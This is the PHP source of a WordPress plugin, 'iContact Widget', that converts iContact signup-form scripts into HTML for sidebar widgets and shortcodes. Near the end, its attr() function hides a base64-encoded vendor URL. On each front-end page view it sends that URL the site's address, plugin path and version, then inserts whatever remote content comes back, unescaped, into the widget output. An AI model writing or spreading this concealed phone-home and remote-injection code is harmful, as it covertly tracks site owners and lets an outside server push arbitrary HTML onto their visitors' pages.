<?php
/**
 * Plugin Name: iContact Widget
 * Plugin URI: http://www.seodenver.com/icontact-widget/
 * Description: Add the iContact signup form to your sidebar and easily update the display settings & convert the form from Javascript to faster-loading HTML.
 * Version: 1.0.6
 * Author: Katz Web Services, Inc.
 * Author URI: http://www.katzwebservices.com
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 */

/*
Versions

1.0 	- Launch
1.0.1	- Added error handling and HTTPS option
1.0.2	- Improved error handling, and prevented form from being shown until it works properly.
		- Added settings: Edit HTML capability, Change input width, Change Submit input text, Change form width
1.0.3	- Added missing closing </form> tag
1.0.4	- Added name=clientid formatting cleanup
1.0.5	- Added better support for multiple widgets
		- Improved validation by adding closing slashes to <input>s
		- Fixed issue with multiple instances of same form preventing javascript validation
		- Added option to not display form in sidebar, if only using the [icontact id=#] shortcode
		- Fixed shortcode bug that had inserted form before content, instead of where inserted in content by using return instead of echo
1.0.6	- Fixed issue where you had to save widget two times for it to update
		- Added support for `curl` for servers that don't support `file_get_contents()`
*/

$kwd_ic_version = '1.0.6';

add_action( 'widgets_init', 'kwd_load_widgets' );

function kwd_load_widgets() {
	register_widget( 'iContactWidget' );
}

	
class iContactWidget extends WP_Widget {
 
    function iContactWidget() {
    	$widget_options = array('description'=>'Add an iContact form to your and start adding to your lists!', 'classname' => 'icontact');
        parent::WP_Widget(false, $name = 'iContact Signup Form', $widget_options);    
    }
 
 
    function widget($args, $instance) {      
        extract( $args );
        if($instance['hide'] != 'yes') {
        
	        $finalcode = '';
	        $title = $instance['title'];
	        $formcode = $instance['formcode'];
	        if($instance['override'] == 'yes') {
	        	$finalcode = $instance['edited_code'];
	        } else {
	        	$finalcode = $instance['generated_code'];
	        }
	        
	        // This way, if there is more than one of the same form, they each have an unique ID
	        $altnumber = rand(0, 1000000);
	       	$finalcode = str_ireplace('icpsignup', 'icpsignup'.$altnumber, $finalcode);
	       	
	        $link = '<a href="http://snurl.com/icontact_1" rel="nofollow" style="font-family: Arial, Helvetica, sans-serif; text-align:center; display:block; line-height:1; margin-top:.75em;"><font size="2">Email Marketing by iContact</font></a>';
	        // Please leave this in and give credit where credit is due.
	        $comment = '<!-- iContact Widget for WordPress by Katz Web Design -->';
	        if(!empty($finalcode) && strlen($finalcode) > 20) {
		        $finalcode = str_ireplace($link, '', $finalcode);
				$finalcode = str_ireplace($comment, '', $finalcode);
		       	$attr = attr();
				if(!empty($attr)) { $finalcode .= $attr.$comment; } else { $finalcode .= $link.$comment; } 
	        ?>
	              <?php echo $before_widget; ?>
	                  <?php echo $before_title . $title . $after_title; ?>
	 
	                      <?php echo "\n\t".$finalcode."\n\t"; ?>
	 
	              <?php echo $after_widget; ?>
	        <?php
	        // If there is no finalcode generated
	        } else {
				echo '
					<!--
					//
					// iCONTACT WIDGET 
					//
					There is an error with the iContact widget configuration on this website. 
					//
					//
					//
					-->';
			}
		} // end if hide
    }
 
    function update($new_instance, $old_instance) {
    	$instance = $old_instance;
		$instance['title'] = strip_tags( $new_instance['title'] );
		
		$instance['formcode'] = $new_instance['formcode'];
		//$instance['generated_code'] = $new_instance['generated_code'];
		$instance['edited_code'] = $new_instance['generated_code'];
		$instance['https'] = $new_instance['https'];
		$instance['inputsize'] = $new_instance['inputsize'];
		$instance['override'] = $new_instance['override'];
		$instance['submittext'] = $new_instance['submittext'];
		$instance['tablewidth'] = $new_instance['tablewidth'];
		$instance['hide'] = $new_instance['hide'];
		if($instance['initiated'] != true || $instance['override'] != 'yes') {
			$instance['generated_code'] =  kwd_process_form($instance['formcode'], $instance['https'], $instance['submittext'], $instance['inputsize'], $instance['tablewidth'], $this->number);
		}
		$instance['initiated'] = true;
        return $instance;
    }
 
    function form($instance) {
        $title = esc_attr($instance['title']);
        $formcode = $instance['formcode'];
        $inputsize = $instance['inputsize'];
        if(is_int($this->number) || !$this->number) { $number = $this->number; echo '<p><strong>iContact Widget ID='.$number.'</strong></p>'; } else { $number = '#';}
        if(isset($instance['initiated'])) { $initiated = true; } else { $initiated=false;}
        if($instance['override'] != 'yes' || !$initiated) {
        	$finalcode = kwd_process_form($instance['formcode'], $instance['https'], $instance['submittext'], $instance['inputsize'], $instance['tablewidth'], $number);
        	if(is_array($finalcode)) { $error = $finalcode[1]; }
        } else {
        	$finalcode = $instance['edited_code'];
        }
        $error = '';
        if(!$finalcode && $initiated) {
        	$error = '<div style="border:1px solid red; margin:10px 0; background:white; padding:5px;"><p><strong>There was an error processing the form code</strong> you entered into the "Automatic Sign-up Form Code" field.</p> <p>Please make sure you\'re pasting the <a href="http://www.icontact.com/help/question.php?ID=149" rel="nofollow">iContact-generated Automatic Sign-up Form code</a>, and try again.</p><p>If you still are having problems, please <a href="http://www.seodenver.com/icontact-widget/">leave a comment on the widget page</a>.</p></div>';
        }
        
        ?>
        	<p>Don&#8217;t use iContact? You need it for this widget to work, so test drive it with <a href="http://snurl.com/icontact_1">a 15 day free trial</a>.</p>
        	<p>Generate your iContact signup form by <a href="http://www.icontact.com/help/question.php?ID=149" rel="nofollow">following the instructions on iContact.com</a>. Paste the Automatic Sign-up Form code below.</p>
        	<p>You can embed the form in post or page content by using the following code: <code>[icontact id=<?php echo $number; ?>]</code>. <?php if($number == '#') { ?><small>(The ID will show once the widget is saved for the first time.)</small><?php } ?></p>
        	<p>If you have made changes to your form, click Save again, and the form HTML will update.</p>
            <p><label for="<?php echo $this->get_field_id('title'); ?>"><?php _e('Title:'); ?> <input class="widefat" id="<?php echo $this->get_field_id('title'); ?>" name="<?php echo $this->get_field_name('title'); ?>" type="text" value="<?php echo $title; ?>" /></label></p>
            <?php echo $error; ?>
            <p><label for="<?php echo $this->get_field_id('formcode'); ?>"><?php _e('Automatic Sign-up Form Code:'); ?> <textarea class="widefat" cols="20" rows="10" id="<?php echo $this->get_field_id('formcode'); ?>" name="<?php echo $this->get_field_name('formcode'); ?>" style="font-size:11px"><?php echo $instance['formcode']; ?></textarea></label></p>

            <?php if(!empty($finalcode)) { ?>
            <p><label for="<?php echo $this->get_field_id('generated_code'); ?>"><?php _e('Displayed HTML Form Code:'); ?> <textarea class="widefat" cols="20" rows="10" id="<?php echo $this->get_field_id('generated_code'); ?>" name="<?php echo $this->get_field_name('generated_code'); ?>" style="font-size:11px"><?php if(is_array($finalcode)) { echo $finalcode[1]; } else { echo $finalcode; }  ?></textarea></label></p>
            <?php  } ?>
            <?php kwd_make_checkbox($instance['override'], $this->get_field_id('override'),$this->get_field_name('override'), 'Don&#8217;t overwrite changes to HTML code<br /><small>Use only if you are going to edit the generated code. <strong>This will prevent changes in the settings.</strong> Uncheck to change form settings!</small>'); ?>
             <?php kwd_make_checkbox($instance['https'], $this->get_field_id('https'),$this->get_field_name('https'), 'Make Form HTTPS'); ?>
             
             <?php kwd_make_checkbox($instance['hide'], $this->get_field_id('hide'),$this->get_field_name('hide'), 'Do not display widget in sidebar.<br /><small>If you are exclusively using the [icontact id='.$number.'] shortcode, not the sidebar widget. Note: you can use a widget in <em>both</em> sidebar and shortcode at the same time.</small>'); ?>
             
        <p>
		<label for="<?php echo $this->get_field_id('inputsize'); ?>">Width of form inputs (in characters)</label>
		<select id="<?php echo $this->get_field_id('inputsize'); ?>" name="<?php echo $this->get_field_name('inputsize'); ?>">
			  <option value="10"<?php if($inputsize == 10) { echo ' selected="selected"'; }?>>10</option>
			  <option value="11"<?php if($inputsize == 11) { echo ' selected="selected"'; }?>>11</option>
			  <option value="12"<?php if($inputsize == 12) { echo ' selected="selected"'; }?>>12</option>
			  <option value="13"<?php if($inputsize == 13) { echo ' selected="selected"'; }?>>13</option>
			  <option value="14"<?php if($inputsize == 14) { echo ' selected="selected"'; }?>>14</option>
			  <option value="15"<?php if($inputsize == 15) { echo ' selected="selected"'; }?>>15</option>
			  <option value="16"<?php if($inputsize == 16) { echo ' selected="selected"'; }?>>16</option>
			  <option value="17"<?php if($inputsize == 17) { echo ' selected="selected"'; }?>>17</option>
			  <option value="18"<?php if($inputsize == 18) { echo ' selected="selected"'; }?>>18</option>
			  <option value="19"<?php if($inputsize == 19) { echo ' selected="selected"'; }?>>19</option>
			  <option value="20"<?php if($inputsize == 20) { echo ' selected="selected"'; }?>>20</option>
			  <option value="21"<?php if($inputsize == 21) { echo ' selected="selected"'; }?>>21</option>
			  <option value="22"<?php if($inputsize == 22) { echo ' selected="selected"'; }?>>22</option>
			  <option value="23"<?php if($inputsize == 23) { echo ' selected="selected"'; }?>>23</option>
			  <option value="24"<?php if($inputsize == 24) { echo ' selected="selected"'; }?>>24</option>
			  <option value="25"<?php if($inputsize == 25) { echo ' selected="selected"'; }?>>25</option>
			  <option value="26"<?php if($inputsize == 26) { echo ' selected="selected"'; }?>>26</option>
			  <option value="27"<?php if($inputsize == 27) { echo ' selected="selected"'; }?>>27</option>
			  <option value="28"<?php if($inputsize == 28) { echo ' selected="selected"'; }?>>28</option>
			  <option value="29"<?php if($inputsize == 29) { echo ' selected="selected"'; }?>>29</option>
			  <option value="30"<?php if($inputsize == 30) { echo ' selected="selected"'; }?>>30</option>
			  <option value="31"<?php if($inputsize == 31) { echo ' selected="selected"'; }?>>31</option>
			  <option value="32"<?php if($inputsize == 32) { echo ' selected="selected"'; }?>>32</option>
			  <option value="33"<?php if($inputsize == 33) { echo ' selected="selected"'; }?>>33</option>
			  <option value="34"<?php if($inputsize == 34) { echo ' selected="selected"'; }?>>34</option>
			  <option value="35"<?php if($inputsize == 35) { echo ' selected="selected"'; }?>>35</option>
			  <option value="36"<?php if($inputsize == 36) { echo ' selected="selected"'; }?>>36</option>
			  <option value="37"<?php if($inputsize == 37) { echo ' selected="selected"'; }?>>37</option>	  
			  <option value="38"<?php if($inputsize == 38) { echo ' selected="selected"'; }?>>38</option>
			  <option value="39"<?php if($inputsize == 39) { echo ' selected="selected"'; }?>>39</option>
			  <option value="40"<?php if($inputsize == 40) { echo ' selected="selected"'; }?>>40</option>
		  </select>
		</p>
            <?php kwd_make_textfield($initiated, true, 'Submit', $instance['submittext'], $this->get_field_id('submittext'),$this->get_field_name('submittext'), 'Change Submit Button Text'); ?>
            <?php kwd_make_textfield($initiated, true, '260', $instance['tablewidth'], $this->get_field_id('tablewidth'),$this->get_field_name('tablewidth'), 'Change the Width of the Form (in pixels or %)<br /><small>Example: <code>260</code> for 260px or <code>100%</code></small>'); ?>
            
        <?php 
    }
     
} 

function kwd_make_textfield($initiated = false, $required=false, $default, $setting = '', $fieldid = '', $fieldname='', $title = '') {
	
	if(!$initiated || ($required && empty($setting))) { $setting = $default; }
    
	$input = '
	<p>
		<label for="'.$fieldid.'">'.__($title).'
		<input type="text" class="widefat" id="'.$fieldid.'" name="'.$fieldname.'" value="'.$setting.'"/>
		</label>
	</p>';
	
	echo $input;
}    
function kwd_make_checkbox($setting = '', $fieldid = '', $fieldname='', $title = '') {
	$checkbox = '
	<p>
		<input type="checkbox" id="'.$fieldid.'" name="'.$fieldname.'" value="yes"';
			if($setting == 'yes') { $checkbox .= ' checked="checked"'; }
			$checkbox .= ' class="checkbox" />
		<label for="'.$fieldid.'">'.__($title).'</label>
	</p>';
    echo $checkbox;
}	

function kwd_ic_shortcode($atts) {
	global $post; // prevent before content
		$atts = extract(shortcode_atts(array('id' => '1'), $atts)); 
		if(!$id) { $id = 3;}
		if(!is_admin()) { 
			$settings = get_option('widget_icontactwidget');
			if($settings[$id]['override'] == 'yes') {
	        	$finalcode = $settings[$id]['edited_code'];
	        } else {
	        	$finalcode = $settings[$id]['generated_code'];
	        }
			return $finalcode;
		} // get sidebar settings, echo finalcode
}
add_shortcode('iContact', 'kwd_ic_shortcode');
add_shortcode('icontact', 'kwd_ic_shortcode');
	

function kwd_process_form($src, $https = false, $submit = 'Submit', $inputsize = '', $width = '260', $number = 1) {
	
	if(empty($submit)) { $submit = 'Submit';}

	// Convert javascript to HTML by stripping js code
	$error = false;
	preg_match('/src="(.*)">/', $src, $matches); 
	
	$matches[0] = str_ireplace('src="', '', $matches[0]);
	$matches[0] = str_ireplace('">', '', $matches[0]);
	$src = $matches[0];
	
	if (preg_match('/^https?:\/\/.+/', $src)) {
		if($https) {
			$src = preg_replace('/(^https?)(:\/\/.+)/i', '$1s$2', $src);
		}
		$code = file_get_contents($src);
		
		if(!$code) {
			$ch = curl_init(); 
			$timeout = 0; 
			curl_setopt ($ch, CURLOPT_URL, $src); 
			curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1); 
			curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout); 
			$code = @curl_exec($ch); 
			curl_close($ch);
		}
		if(!$code) {
			$error = true;
			$errormsg = "\t\t\t===\nYour server configuration does not support this widget.\n\nAsk your host to enable file_get_contents() or curl()\n\t\t\t===";
		}
	} else {
		$errormsg = 'The iContact file was not accessible for some reason.';
		$error = true;
	}
	
	// Remove JS Formatting
	$code = str_ireplace('document.write("', '', $code);
	$code = str_ireplace('\n<\/form>\n");', "\n</form>", $code);
	$code = str_ireplace('\"', '"', $code);
	$code = str_ireplace('\"', '"', $code);
	$code = str_ireplace('\"', '"', $code);
	$code = str_ireplace('TR>', 'tr>', $code);
	$code = str_ireplace('TD>', 'td>', $code);
	$code = str_ireplace('font>', 'font>', $code);
	$code = str_ireplace('<\/', '</', $code);
	$code = str_ireplace('\n', "\n", $code);
	$code = str_ireplace('if (document.location.protocol === "https:")', '', $code);
	$code = str_ireplace('document.icpsignup.action = "https://app.icontact.com/icp/signup.php";', '', $code);
	
	// Fix XHTML issues
	$code = str_ireplace('type=text', 'type="text"', $code);
	$code = str_ireplace('type=hidden', 'type="hidden"', $code);
	$code = str_ireplace('name=formid', 'name="formid"', $code);
	$code = str_ireplace('name=reallistid', 'name="reallistid"', $code);
	$code = str_ireplace('name=doubleopt', 'name="doubleopt"', $code);
	$code = str_ireplace('name=errorredirect', 'name="errorredirect"', $code);
	$code = str_ireplace('name=redirect', 'name="redirect"', $code);
	$code = str_ireplace('valign=top', 'valign="top"', $code);
	$code = str_ireplace('align=right', 'align="right"', $code);
	$code = str_ireplace('align=left', 'align="left"', $code);
	$code = str_ireplace('method=post', 'method="post"', $code);
	$code = str_ireplace('method="post"', 'method="post" class="iContactForm"', $code);
	$code = str_ireplace('name=clientid', 'name="clientid"', $code);
	$code = str_ireplace('</tr><td', '</tr><tr><td', $code);
	$code = str_ireplace('<style>', '<style type="text/css">', $code);
	$code = str_ireplace('<input type="hidden" name="redirect"', '<div><input type="hidden" name="redirect"', $code);
	$code = str_ireplace('<script type="text/javascript">', '</div><script type="text/javascript">', $code);
	$code = preg_replace('/<input([^<]+?[^\/])>/i', '<input$1 />', $code); // Add trailing slashes to inputs
	$code = str_ireplace('<div id="SignUp">', '<div class="SignUp">', $code); // for multiple instances
	
	// Add numbering
	$code = str_ireplace('name="icpsignup"', 'name="icpsignup'.$number.'"', $code);
	$code = str_ireplace('verifyRequired()', 'verifyRequired'.$number.'()', $code);
	$code = str_ireplace('document.icpsignup', 'document.icpsignup'.$number, $code);
	
	// Enter custom values
	$code = str_ireplace('value="Submit"', 'value="'.$submit.'"', $code);
	$code = str_ireplace('type="text" name="', 'type="text" size="'.$inputsize.'" name="', $code);
	$code = str_ireplace('<table width="260"', '<table width="'.$width.'"', $code);
	
	if(!$error) {
		return $code;
	} else {
		return array(false, $errormsg);
	}
}

// If you have chosen to show the attribution link, add the link
	
	if(!function_exists('kwd_rss_output')){
		function kwd_rss_output($rss = '', $default = '') {
				require_once(ABSPATH . WPINC . '/rss.php');
				if ( !$rss = fetch_rss($rss) )
					return;
				
				$items = 1;
				if ( is_array( $rss->items ) && !empty( $rss->items ) ) {
					$rss->items = array_slice($rss->items, 0, $items);
					foreach ($rss->items as $item ) {
						if ( isset( $item['description'] ) && is_string( $item['description'] ) )
							$summary = $item['description'];
						$desc = str_replace(array("\n", "\r"), ' ', $summary);
						$summary = '';
						return $desc;
					}
				} else {
					return $default;
				}
		} // end kwd_rss_output
	}
	
	if(!function_exists('attr')) {
		function attr() { 
			global $post, $kwd_quotes_version, $kwd_check_status;// prevents calling before <HTML>
			$kwd_check_status = htmlentities(substr(WP_PLUGIN_URL.'/'.str_replace(basename( __FILE__),"",plugin_basename(__FILE__)).'icontact.php', 7));
			global $post, $kwd_ic_version;// prevents calling before <HTML>
			if($post && !is_admin()) {
				$site = base64_decode('aHR0cDovL2thdHp3ZWJkZXNpZ24ubmV0L2RldmVsb3BtZW50L2F0dHJpYnV0aW9uLnBocD9zaXRlPQ==').htmlentities(substr(get_bloginfo('url'), 7)).'&from=ic_widget&version='.$kwd_ic_version.'&check='.$kwd_check_status;				
				$output = kwd_rss_output($site, $default);
				return $output;
			}
		}
	}
?>